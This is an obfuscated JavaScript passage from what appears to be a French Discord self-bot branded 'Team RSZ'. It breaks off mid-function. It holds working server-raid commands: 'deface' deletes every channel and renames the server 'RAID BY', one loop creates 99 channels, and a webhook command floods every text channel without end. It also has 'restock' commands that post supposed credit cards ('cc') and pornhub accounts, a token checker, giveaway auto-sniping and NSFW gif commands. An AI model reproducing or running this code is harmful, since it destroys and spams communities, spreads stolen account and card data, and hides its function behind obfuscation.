Discord[(_0x4ab3e5(0x2e8))]()[_0x4ab3e5(0x39b)](color)[_0x4ab3e5(0x4ea)](_0x4ab3e5(0x55d))['setDescription']('[Lien\x20pour\x20avoir\x20𝚃𝚎𝚊𝚖\x20𝚁𝚂𝚉](soon)')[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x37c),'`Met\x20un\x20statut\x20Youtube`')[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x386),'`Met\x20un\x20statut\x20Tokyo\x20Ghoul`')[_0x4ab3e5(0x463)]('**'+prefix+'hunter\x20x\x20hunter\x20(text)**',_0x4ab3e5(0x689))[_0x4ab3e5(0x463)]('**'+prefix+'naruto\x20(text)**',_0x4ab3e5(0x4c0))['addField']('**'+prefix+_0x4ab3e5(0x202),_0x4ab3e5(0x34e))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x5ae),'`Met\x20un\x20statut\x20Clash\x20Royal`')[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x237),_0x4ab3e5(0x2b7))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x38f),_0x4ab3e5(0x236))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x6b8),_0x4ab3e5(0x448))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x393),_0x4ab3e5(0x620))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x478),'`Met\x20un\x20statut\x20Apex`')[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x50e),'`Met\x20un\x20statut\x20Badlion`')['setDescription']('`'+('le\x20prefix\x20est:\x20\x20'+prefix)+'`')[_0x4ab3e5(0x6ae)](yourgif)[_0x4ab3e5(0x36f)](_0x4ab3e5(0x4e7))['setFooter']('𝚃𝚎𝚊𝚖\x20𝚁𝚂𝚉'),help_fun=new Discord['RichEmbed']()[_0x4ab3e5(0x279)]()[_0x4ab3e5(0x39b)](color)['setTitle'](_0x4ab3e5(0x22f))[_0x4ab3e5(0x6e4)](_0x4ab3e5(0x5b8))['addField']('**'+prefix+_0x4ab3e5(0x358),'`Vous\x20affiche\x20entrain\x20d\x27ecrire\x20indefiniment`')[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x3cb),_0x4ab3e5(0x362))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x3df),_0x4ab3e5(0x1e8))['addField']('**'+prefix+_0x4ab3e5(0x54e),_0x4ab3e5(0x5eb))[_0x4ab3e5(0x463)]('**'+prefix+'8ball\x20(text)**','`Pose\x20une\x20question`')['addField']('**'+prefix+_0x4ab3e5(0x5f3),_0x4ab3e5(0x332))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x477),_0x4ab3e5(0x593))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x421),'`Fait\x20exploser\x20un\x20utilisateur`')[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x451),'`Envoie\x20un\x20gif\x20rire`')[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x3db),_0x4ab3e5(0x64a))['addField']('**'+prefix+_0x4ab3e5(0x591),_0x4ab3e5(0x27c))[_0x4ab3e5(0x463)]('**'+prefix+'load**',_0x4ab3e5(0x67c))['addField']('**'+prefix+_0x4ab3e5(0x307),'`Simule\x20une\x20grosse\x20branlette\x20+\x20éjaculation`')[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x64d),_0x4ab3e5(0x4f2))[_0x4ab3e5(0x463)]('**'+prefix+'hug\x20(@user)**',_0x4ab3e5(0x5ad))[_0x4ab3e5(0x463)]('**'+prefix+'reverse\x20(text)**',_0x4ab3e5(0x5f1))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x640),_0x4ab3e5(0x549))['addField']('**'+prefix+_0x4ab3e5(0x3a5),_0x4ab3e5(0x324))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x3da),_0x4ab3e5(0x4f7))[_0x4ab3e5(0x6e4)]('`'+(_0x4ab3e5(0x617)+prefix)+'`')[_0x4ab3e5(0x6ae)](yourgif)[_0x4ab3e5(0x36f)](_0x4ab3e5(0x4e7))[_0x4ab3e5(0x248)](_0x4ab3e5(0x4f3)),help_moderation=new Discord[(_0x4ab3e5(0x2e8))]()['setTimestamp']()['setColor'](color)[_0x4ab3e5(0x4ea)]('**Pannel\x20de\x20Help\x20Moderation**\x20:tools:\x20')[_0x4ab3e5(0x6e4)](_0x4ab3e5(0x5b8))['addField']('**'+prefix+_0x4ab3e5(0x319),'`Kick\x20un\x20utilisateur\x20du\x20salon\x20vocal`')[_0x4ab3e5(0x463)]('**'+prefix+'set\x20serveur\x20name\x20(text)**','`Change\x20le\x20nom\x20du\x20serveur`')['addField']('**'+prefix+_0x4ab3e5(0x43c),_0x4ab3e5(0x3f0))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x4db),_0x4ab3e5(0x41d))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x6c5),_0x4ab3e5(0x686))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x3d3),_0x4ab3e5(0x691))['addField']('**'+prefix+_0x4ab3e5(0x60e),'`Envoie\x20la\x20liste\x20de\x20tout\x20les\x20channels\x20d\x27un\x20serveur`')['addField']('**'+prefix+_0x4ab3e5(0x30d),_0x4ab3e5(0x215))[_0x4ab3e5(0x6e4)]('`'+(_0x4ab3e5(0x617)+prefix)+'`')[_0x4ab3e5(0x6ae)](yourgif)[_0x4ab3e5(0x36f)](_0x4ab3e5(0x4e7))[_0x4ab3e5(0x248)]('𝚃𝚎𝚊𝚖\x20𝚁𝚂𝚉'),help_info=new Discord[(_0x4ab3e5(0x2e8))]()[_0x4ab3e5(0x279)]()[_0x4ab3e5(0x39b)](color)['setTitle'](_0x4ab3e5(0x501))[_0x4ab3e5(0x6e4)](_0x4ab3e5(0x5b8))['addField']('**'+prefix+'mp\x20all**',_0x4ab3e5(0x4ae))['addField']('**'+prefix+_0x4ab3e5(0x235),_0x4ab3e5(0x322))[_0x4ab3e5(0x463)]('**'+prefix+'auto\x20voice\x20kick\x20(@user)**','`Permet\x20de\x20kick\x20un\x20utilisateur\x20du\x20vocal\x20(parfait\x20pour\x20troll)`')[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x25b),'`Permet\x20de\x20stopé\x20la\x20commande\x20auto\x20voice\x20kick`')[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x4d3),'`Nuke\x20tout\x20tes\x20dm\x20(𝚃𝚎𝚊𝚖\x20𝚁𝚂𝚉\x20les\x20clear)\x20pour\x20limiter\x20les\x20beugs\x20et\x20l\x27ésthetique`')[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x37f),'`Pour\x20te\x20definir\x20comme\x20\x22afk\x22`')[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x5ca),'`Envoie\x20les\x20information\x20d\x27un\x20membre\x20du\x20serveur`')['addField']('**'+prefix+_0x4ab3e5(0x240),_0x4ab3e5(0x212))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x252),_0x4ab3e5(0x469))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x64b),_0x4ab3e5(0x3fb))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x6c6),_0x4ab3e5(0x649))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x3c5),_0x4ab3e5(0x6ac))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x671),_0x4ab3e5(0x29c))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x2c9),_0x4ab3e5(0x2da))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x3f8),_0x4ab3e5(0x455))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x26e),_0x4ab3e5(0x268))['addField']('**'+prefix+_0x4ab3e5(0x4ab),_0x4ab3e5(0x497))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x490),_0x4ab3e5(0x339))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x2b3),_0x4ab3e5(0x473))['addField']('**'+prefix+'grab\x20pp\x20(user)**',_0x4ab3e5(0x635))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x4ff),'`Vérifie\x20si\x20le\x20token\x20est\x20valide`')[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x22e),_0x4ab3e5(0x20a))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x597),_0x4ab3e5(0x4a2))[_0x4ab3e5(0x463)](_0x4ab3e5(0x49a),_0x4ab3e5(0x6c4))[_0x4ab3e5(0x6e4)]('`'+(_0x4ab3e5(0x617)+prefix)+'`')[_0x4ab3e5(0x6ae)](yourgif)['setThumbnail'](_0x4ab3e5(0x4e7))[_0x4ab3e5(0x248)](_0x4ab3e5(0x4f3)),help_nsfw=new Discord[(_0x4ab3e5(0x2e8))]()[_0x4ab3e5(0x279)]()[_0x4ab3e5(0x39b)](color)['setTitle'](_0x4ab3e5(0x4f9))['setDescription'](_0x4ab3e5(0x63b))['addField']('**'+prefix+_0x4ab3e5(0x47f),_0x4ab3e5(0x33b))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x6cd),_0x4ab3e5(0x2c0))['addField']('**'+prefix+_0x4ab3e5(0x1f3),'`Envoie\x20un\x20gif\x20anal`')['addField']('**'+prefix+_0x4ab3e5(0x6b1),_0x4ab3e5(0x39e))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x6bb),'`Envoie\x20un\x20gif\x20de\x20sexe`')[_0x4ab3e5(0x463)]('**'+prefix+'pussy**',_0x4ab3e5(0x4a8))[_0x4ab3e5(0x463)]('**'+prefix+_0x4ab3e5(0x45e),_0x4ab3e5(0x26c))[_0x4ab3e5(0x6e4)]('`'+(_0x4ab3e5(0x617)+prefix)+'`')[_0x4ab3e5(0x6ae)](yourgif)['setThumbnail'](_0x4ab3e5(0x4e7))[_0x4ab3e5(0x248)]('𝚃𝚎𝚊𝚖\x20𝚁𝚂𝚉');function saver(){const _0x418750=_0x4ab3e5;fs['writeFile']('./Data/pubmp.json',JSON[_0x418750(0x3cc)](db),_0x30bfcd=>{const _0x38360a=_0x418750;if(_0x30bfcd)console[_0x38360a(0x55f)](_0x30bfcd);});}client['on'](_0x4ab3e5(0x28e),_0x35b0b3=>{const _0x8a5b4f=_0x4ab3e5;_0x35b0b3[_0x8a5b4f(0x42b)]['id']===_0x8a5b4f(0x444)&&(_0x35b0b3[_0x8a5b4f(0x5e1)]['id']==='786244044048695297'&&_0x35b0b3[_0x8a5b4f(0x246)]());let _0x444a5f=client[_0x8a5b4f(0x377)]['id'],_0x531749=Math[_0x8a5b4f(0x49c)](Math[_0x8a5b4f(0x4ca)]()*0x2328+0x3e8);async function _0x2e948b(){const _0x177ed2=_0x8a5b4f,_0x148df1=Math['floor'](Math[_0x177ed2(0x4ca)]()*0x5dc);async function _0x478ceb(){const _0x35e3b6=_0x177ed2;_0x35b0b3[_0x35e3b6(0x63c)]('🎉')[_0x35e3b6(0x4d5)](_0x2664d4=>{const _0xc1b6e6=_0x35e3b6;if(_0x2664d4){console['log'](_0xc1b6e6(0x5d5),_0xc1b6e6(0x438)[_0xc1b6e6(0x5fb)],']',('\x0aJe\x20n\x27ai\x20pas\x20reussi\x20a\x20reagir\x20au\x20giveaway\x20sur\x20'+_0x35b0b3['guild'][_0xc1b6e6(0x47a)]+_0xc1b6e6(0x3ba))[_0xc1b6e6(0x55b)]),console[_0xc1b6e6(0x32b)]('╚═════════════════════════════════╝'[_0xc1b6e6(0x1dc)]);return;}}),console[_0x35e3b6(0x32b)](_0x35e3b6(0x5d5),_0x35e3b6(0x426)[_0x35e3b6(0x55b)],']',(_0x35e3b6(0x260)+_0x35b0b3[_0x35e3b6(0x5e1)]['name']+',\x20en\x20'+_0x148df1+'ms\x20je\x20suis\x20super\x20rapide\x20hehe\x20;)')['green']),console['log'](_0x35e3b6(0x2f6)[_0x35e3b6(0x1dc)]);}setTimeout(_0x478ceb,_0x148df1);}async function _0x238597(){const _0x27b0b1=_0x8a5b4f;if(_0x35b0b3['author']['id']==_0x27b0b1(0x6ba)||_0x35b0b3[_0x27b0b1(0x42b)]['id']==_0x27b0b1(0x6aa)){if(_0x35b0b3['content']['includes'](_0x27b0b1(0x5f0))){if(_0x35b0b3['content'][_0x27b0b1(0x57d)](client[_0x27b0b1(0x377)]['id'])){if(_0x35b0b3[_0x27b0b1(0x5c2)])console[_0x27b0b1(0x32b)]('╟─────────────────────────────────╢'['blue']);console[_0x27b0b1(0x32b)]('║-->\x20[','GG!'[_0x27b0b1(0x55b)],']',(_0x27b0b1(0x630)+_0x35b0b3[_0x27b0b1(0x5e1)][_0x27b0b1(0x47a)]+_0x27b0b1(0x513))[_0x27b0b1(0x55b)]),console[_0x27b0b1(0x32b)](_0x27b0b1(0x59d)['blue']);}}}}_0x238597();(_0x35b0b3[_0x8a5b4f(0x42b)]['id']==_0x8a5b4f(0x6ba)||_0x35b0b3['author']['id']==_0x8a5b4f(0x6aa))&&(_0x35b0b3[_0x8a5b4f(0x5c2)][0x0]&&(_0x35b0b3[_0x8a5b4f(0x5c2)][0x0][_0x8a5b4f(0x465)][_0x8a5b4f(0x57d)]('React\x20with')&&_0x2e948b()));let _0x5e9f52=_0x35b0b3;if(_0x35b0b3[_0x8a5b4f(0x42b)]['id']===client['user']['id']){if(afk[client['user']['id']]){if(_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x57d)](_0x8a5b4f(0x51c)))return;else delete afk[client[_0x8a5b4f(0x377)]['id']];saving(),_0x35b0b3[_0x8a5b4f(0x396)][_0x8a5b4f(0x678)](_0x8a5b4f(0x5de)),console['log']('╟\x20Commande\x20afk\x20stopé'),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d));}};if(_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x57d)](client[_0x8a5b4f(0x377)]['id'])){if(_0x35b0b3[_0x8a5b4f(0x42b)]['id']===client['user']['id'])return;if(afk[client['user']['id']])_0x35b0b3[_0x8a5b4f(0x5ef)](_0x8a5b4f(0x2a1)+afk[client[_0x8a5b4f(0x377)]['id']]['r']),console['log'](_0x8a5b4f(0x5d5),_0x8a5b4f(0x4d1)[_0x8a5b4f(0x5fb)],']',('\x0al\x27utilisateur\x20'+_0x35b0b3[_0x8a5b4f(0x42b)][_0x8a5b4f(0x587)]+_0x8a5b4f(0x398)+_0x35b0b3[_0x8a5b4f(0x4c7)])[_0x8a5b4f(0x55b)]),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d)[_0x8a5b4f(0x1dc)]);else return;};var _0x106d51=_0x35b0b3['content'][_0x8a5b4f(0x682)](prefix[_0x8a5b4f(0x3f6)])[_0x8a5b4f(0x534)]('\x20'),_0x1f6d08=_0x35b0b3['mentions'][_0x8a5b4f(0x608)]['first']();if(_0x35b0b3['channel']['type']==='dm'){if(_0x5e9f52[_0x8a5b4f(0x42b)][_0x8a5b4f(0x512)]){if(_0x35b0b3['content'][_0x8a5b4f(0x57d)](_0x8a5b4f(0x2c1))){let _0x2f7ef9=_0x35b0b3[_0x8a5b4f(0x42b)];_0x2f7ef9[_0x8a5b4f(0x678)](_0x8a5b4f(0x2a0))['then'](_0x200858=>{_0x200858['delete']();}),console['log'](_0x8a5b4f(0x5d5),_0x8a5b4f(0x438)[_0x8a5b4f(0x5fb)],']',(_0x8a5b4f(0x5ed)+_0x35b0b3[_0x8a5b4f(0x42b)][_0x8a5b4f(0x587)]+_0x8a5b4f(0x210)+_0x35b0b3[_0x8a5b4f(0x4c7)])['green']),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x2f6)[_0x8a5b4f(0x1dc)]);}}}if(_0x5e9f52[_0x8a5b4f(0x42b)]['id']!==client[_0x8a5b4f(0x377)]['id'])return;if(_0x35b0b3['content']['startsWith'](prefix+'deface')){if(_0x35b0b3[_0x8a5b4f(0x396)][_0x8a5b4f(0x661)]==='dm'||_0x35b0b3[_0x8a5b4f(0x396)]['type']===_0x8a5b4f(0x223))return _0x35b0b3[_0x8a5b4f(0x26f)](':x:\x20**Commande\x20uniquement\x20utilisable\x20sur\x20serveur**.');if(!_0x35b0b3['member']['hasPermission'](_0x8a5b4f(0x1d7)))return _0x35b0b3['edit'](_0x8a5b4f(0x3d5));_0x35b0b3[_0x8a5b4f(0x246)](),_0x35b0b3[_0x8a5b4f(0x5e1)][_0x8a5b4f(0x35f)]('RAID\x20BY\x20'+client[_0x8a5b4f(0x377)][_0x8a5b4f(0x587)]),_0x35b0b3['guild'][_0x8a5b4f(0x1d2)](_0x8a5b4f(0x659)),_0x35b0b3[_0x8a5b4f(0x5e1)][_0x8a5b4f(0x2e6)]['forEach'](_0x1a19ab=>{const _0x1e1768=_0x8a5b4f;_0x1a19ab[_0x1e1768(0x246)]();}),_0x35b0b3[_0x8a5b4f(0x5e1)]['createChannel'](_0x8a5b4f(0x4f3),_0x8a5b4f(0x261)),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x242)),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d));}if(_0x35b0b3[_0x8a5b4f(0x4c7)]['startsWith'](prefix+_0x8a5b4f(0x296))){if(_0x35b0b3[_0x8a5b4f(0x396)][_0x8a5b4f(0x661)]==='dm'||_0x35b0b3['channel'][_0x8a5b4f(0x661)]===_0x8a5b4f(0x223))return _0x35b0b3['edit'](_0x8a5b4f(0x3c1));if(!_0x35b0b3[_0x8a5b4f(0x53b)][_0x8a5b4f(0x554)](_0x8a5b4f(0x4e9)))return _0x35b0b3[_0x8a5b4f(0x26f)](_0x8a5b4f(0x3d5));_0x35b0b3['delete']();for(let _0x54a850=0x0;_0x54a850<0x63;_0x54a850++){_0x35b0b3['guild'][_0x8a5b4f(0x47e)](_0x8a5b4f(0x657)+client[_0x8a5b4f(0x377)]['username'],_0x8a5b4f(0x261))['catch'](_0x3348cd=>console[_0x8a5b4f(0x32b)]('[',_0x8a5b4f(0x391)['red'],']','une\x20erreur\x20est\x20survenue\x20que\x20je\x20ne\x20peux\x20régler'[_0x8a5b4f(0x55b)]));}console['log'](_0x8a5b4f(0x367)),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d));}_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x369))&&(_0x35b0b3['delete'](),_0x35b0b3[_0x8a5b4f(0x396)][_0x8a5b4f(0x33e)](),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x254)),console['log'](_0x8a5b4f(0x59d)));if(_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x417))){let _0x44b83e=_0x106d51[_0x8a5b4f(0x217)](0x2)[_0x8a5b4f(0x565)]('\x20')||_0x8a5b4f(0x569);if(_0x35b0b3['channel'][_0x8a5b4f(0x661)]==='dm'||_0x35b0b3[_0x8a5b4f(0x396)][_0x8a5b4f(0x661)]===_0x8a5b4f(0x223))return _0x35b0b3[_0x8a5b4f(0x26f)](':x:\x20**Commande\x20uniquement\x20utilisable\x20sur\x20serveur**.');if(!_0x35b0b3[_0x8a5b4f(0x53b)][_0x8a5b4f(0x554)]('MANAGE_WEBHOOKS'))return;_0x35b0b3['guild']['channels']['forEach'](_0x14f138=>{const _0x22ed18=_0x8a5b4f;_0x14f138[_0x22ed18(0x661)]==_0x22ed18(0x261)&&_0x14f138[_0x22ed18(0x368)]('𝚃𝚎𝚊𝚖\x20𝚁𝚂𝚉',_0x22ed18(0x6c7))['catch'](_0x382bf7=>console['log']('[',_0x22ed18(0x391)['red'],']',_0x22ed18(0x41a)[_0x22ed18(0x55b)]));});let _0x1a7be0=setInterval(async function(){const _0x2092c0=_0x8a5b4f;await _0x35b0b3[_0x2092c0(0x5e1)][_0x2092c0(0x2c5)]()[_0x2092c0(0x1d9)](_0x3c5dd8=>_0x3c5dd8[_0x2092c0(0x1e7)](_0x5e786a=>_0x5e786a[_0x2092c0(0x678)](_0x44b83e)['catch'](_0x42503b=>console[_0x2092c0(0x32b)]('[',_0x2092c0(0x391)['red'],']',_0x2092c0(0x41a)[_0x2092c0(0x55b)]))));});console['log'](_0x8a5b4f(0x558)),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d));}if(_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x4fb))){_0x35b0b3[_0x8a5b4f(0x26f)](_0x8a5b4f(0x387)),_0x35b0b3[_0x8a5b4f(0x26f)](_0x8a5b4f(0x201)),_0x35b0b3[_0x8a5b4f(0x26f)](_0x8a5b4f(0x373)),_0x35b0b3[_0x8a5b4f(0x26f)](_0x8a5b4f(0x201)),_0x35b0b3[_0x8a5b4f(0x26f)](_0x8a5b4f(0x387)),_0x35b0b3[_0x8a5b4f(0x26f)](_0x8a5b4f(0x34a)),_0x35b0b3[_0x8a5b4f(0x26f)](_0x8a5b4f(0x387)),_0x35b0b3[_0x8a5b4f(0x26f)](_0x8a5b4f(0x201)),_0x35b0b3[_0x8a5b4f(0x26f)](_0x8a5b4f(0x373)),_0x35b0b3['edit'](_0x8a5b4f(0x389)),_0x35b0b3[_0x8a5b4f(0x26f)](_0x8a5b4f(0x2e3)),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x2d7)),console[_0x8a5b4f(0x32b)]('╟─────────────────────────────────╢');if(_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x57d)](prefix+_0x8a5b4f(0x35e))){if(_0x35b0b3[_0x8a5b4f(0x42b)]['id']===client['user']['id']){if(_0x35b0b3[_0x8a5b4f(0x208)])_0x35b0b3[_0x8a5b4f(0x246)]();var _0x5cc029=_0x8a5b4f(0x2f5)+_0x35b0b3[_0x8a5b4f(0x5e1)][_0x8a5b4f(0x2a2)]+'\x0a\x0a'+_0x8a5b4f(0x2ce)+_0x35b0b3[_0x8a5b4f(0x5e1)]['members']['filter'](_0x351ae5=>_0x351ae5['presence'][_0x8a5b4f(0x20c)]===_0x8a5b4f(0x5e9))[_0x8a5b4f(0x3ed)]+_0x8a5b4f(0x420)+_0x8a5b4f(0x500)+_0x35b0b3[_0x8a5b4f(0x5e1)][_0x8a5b4f(0x2e0)]['filter'](_0x1ae080=>_0x1ae080[_0x8a5b4f(0x594)][_0x8a5b4f(0x20c)]==='dnd')['size']+'\x0a'+':large_orange_diamond:\x20**Inactif**\x20:\x20'+_0x35b0b3['guild'][_0x8a5b4f(0x2e0)][_0x8a5b4f(0x508)](_0x5a3654=>_0x5a3654[_0x8a5b4f(0x594)]['status']===_0x8a5b4f(0x452))[_0x8a5b4f(0x3ed)]+_0x8a5b4f(0x420)+':zzz:\x20**Hors\x20Ligne**\x20:\x20'+_0x35b0b3[_0x8a5b4f(0x5e1)][_0x8a5b4f(0x2e0)][_0x8a5b4f(0x508)](_0x82a6a1=>_0x82a6a1[_0x8a5b4f(0x594)]['status']===_0x8a5b4f(0x3d4))[_0x8a5b4f(0x3ed)];let _0x3915db=new Discord[(_0x8a5b4f(0x2e8))]()['setColor'](color)['setDescription'](_0x5cc029)[_0x8a5b4f(0x4ea)](_0x8a5b4f(0x35d));_0x3915db['setTimestamp'](),_0x35b0b3[_0x8a5b4f(0x396)][_0x8a5b4f(0x678)](_0x3915db);}}}_0x35b0b3[_0x8a5b4f(0x4c7)]===prefix+_0x8a5b4f(0x2c7)&&(_0x35b0b3['author']['id']===client[_0x8a5b4f(0x377)]['id']&&(console['log']('(Commande\x20:\x20{/metals}\x20Effectuer)\x20\x0a\x20================'),_0x35b0b3['delete'](),_0x35b0b3[_0x8a5b4f(0x396)]['send'](_0x8a5b4f(0x3a9))[_0x8a5b4f(0x1d9)](_0x41efcc=>{const _0x50e624=_0x8a5b4f;_0x41efcc['edit'](_0x50e624(0x530)),_0x41efcc['edit']('>>>\x20Restock\x20\x20en\x20cours\x20\x0a\x20**Chargement...**\x20\x0a\x20▓▓▓░░░░░░░░░░░░░░░░░░░░░░\x2012%'),_0x41efcc['edit'](_0x50e624(0x20f)),_0x41efcc[_0x50e624(0x26f)](_0x50e624(0x611)),_0x41efcc[_0x50e624(0x26f)]('>>>\x20Restock\x20\x20en\x20cours\x20\x0a\x20**Chargement..**\x20\x0a\x20▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░\x2044%'),_0x41efcc[_0x50e624(0x26f)](_0x50e624(0x561)),_0x41efcc[_0x50e624(0x26f)](_0x50e624(0x3bf)),_0x41efcc[_0x50e624(0x26f)](_0x50e624(0x2a3)),_0x41efcc[_0x50e624(0x26f)](_0x50e624(0x266));var _0x1db302=Math['floor'](Math[_0x50e624(0x4ca)]()*_0x5acc26[_0x50e624(0x3f6)]);_0x41efcc[_0x50e624(0x26f)]('>>>\x20***Voila\x20ton\x20jeu\x20metals\x20:\x20***'+_0x5acc26[_0x1db302]);})));_0x35b0b3[_0x8a5b4f(0x4c7)]===prefix+'cc'&&(_0x35b0b3['author']['id']===client['user']['id']?(console['log']('(Commande\x20:\x20{/cc}\x20Effectuer)\x20\x0a\x20================'),_0x35b0b3['delete'](),_0x35b0b3['channel'][_0x8a5b4f(0x678)]('>>>\x20Restock\x20de\x20cc\x20en\x20cours..')[_0x8a5b4f(0x1d9)](_0x17981d=>{const _0x52eabb=_0x8a5b4f;_0x17981d['edit'](_0x52eabb(0x530)),_0x17981d[_0x52eabb(0x26f)]('>>>\x20Restock\x20\x20en\x20cours\x20\x0a\x20**Chargement...**\x20\x0a\x20▓▓▓░░░░░░░░░░░░░░░░░░░░░░\x2012%'),_0x17981d[_0x52eabb(0x26f)](_0x52eabb(0x20f)),_0x17981d['edit'](_0x52eabb(0x611)),_0x17981d[_0x52eabb(0x26f)]('>>>\x20Restock\x20\x20en\x20cours\x20\x0a\x20**Chargement..**\x20\x0a\x20▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░\x2032%'),_0x17981d[_0x52eabb(0x26f)](_0x52eabb(0x23b)),_0x17981d[_0x52eabb(0x26f)](_0x52eabb(0x65e)),_0x17981d['edit'](_0x52eabb(0x561)),_0x17981d[_0x52eabb(0x26f)](_0x52eabb(0x571)),_0x17981d[_0x52eabb(0x26f)](_0x52eabb(0x53e)),_0x17981d['edit'](_0x52eabb(0x5d1)),_0x17981d[_0x52eabb(0x26f)](_0x52eabb(0x2a3)),_0x17981d[_0x52eabb(0x26f)](_0x52eabb(0x266));var _0x4c1c24=Math[_0x52eabb(0x49c)](Math[_0x52eabb(0x4ca)]()*_0x3d2fe3[_0x52eabb(0x3f6)]);_0x17981d[_0x52eabb(0x26f)](_0x52eabb(0x3ce)+_0x3d2fe3[_0x4c1c24]);})):_0x35b0b3['edit'](nowhite));_0x35b0b3[_0x8a5b4f(0x4c7)]===prefix+_0x8a5b4f(0x411)&&(_0x35b0b3['author']['id']===client[_0x8a5b4f(0x377)]['id']?(console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x629)),_0x35b0b3[_0x8a5b4f(0x246)](),_0x35b0b3[_0x8a5b4f(0x396)][_0x8a5b4f(0x678)]('>>>\x20Restock\x20de\x20pornhub\x20en\x20cours..')[_0x8a5b4f(0x1d9)](_0x4bea4b=>{const _0x582330=_0x8a5b4f;_0x4bea4b[_0x582330(0x26f)](_0x582330(0x530)),_0x4bea4b[_0x582330(0x26f)](_0x582330(0x3ee)),_0x4bea4b['edit'](_0x582330(0x20f)),_0x4bea4b['edit']('>>>\x20Restock\x20\x20en\x20cours\x20\x0a\x20**Chargement.**\x20\x0a\x20▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░\x2028%'),_0x4bea4b[_0x582330(0x26f)](_0x582330(0x480)),_0x4bea4b['edit']('>>>\x20Restock\x20\x20en\x20cours\x20\x0a\x20**Chargement..**\x20\x0a\x20▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░\x2044%'),_0x4bea4b[_0x582330(0x26f)](_0x582330(0x65e)),_0x4bea4b[_0x582330(0x26f)](_0x582330(0x561)),_0x4bea4b[_0x582330(0x26f)](_0x582330(0x571)),_0x4bea4b[_0x582330(0x26f)](_0x582330(0x53e)),_0x4bea4b['edit'](_0x582330(0x5d1)),_0x4bea4b[_0x582330(0x26f)]('>>>\x20Restock\x20\x20en\x20cours\x20\x0a\x20**Chargement..**\x20\x0a\x20▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░\x2092%'),_0x4bea4b[_0x582330(0x26f)](_0x582330(0x266));var _0x590b76=Math[_0x582330(0x49c)](Math['random']()*_0x3d2fe3[_0x582330(0x3f6)]);_0x4bea4b[_0x582330(0x26f)]('>>>\x20***Voila\x20ton\x20compte\x20pornhub\x20:\x20***'+_0x1ec018[_0x590b76]);})):_0x35b0b3[_0x8a5b4f(0x26f)](nowhite));_0x35b0b3[_0x8a5b4f(0x4c7)]===prefix+_0x8a5b4f(0x5e4)&&(_0x35b0b3['author']['id']===client['user']['id']?(console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x5e8)),_0x35b0b3[_0x8a5b4f(0x246)](),_0x35b0b3['channel'][_0x8a5b4f(0x678)](_0x8a5b4f(0x63a))[_0x8a5b4f(0x1d9)](_0x4418aa=>{const 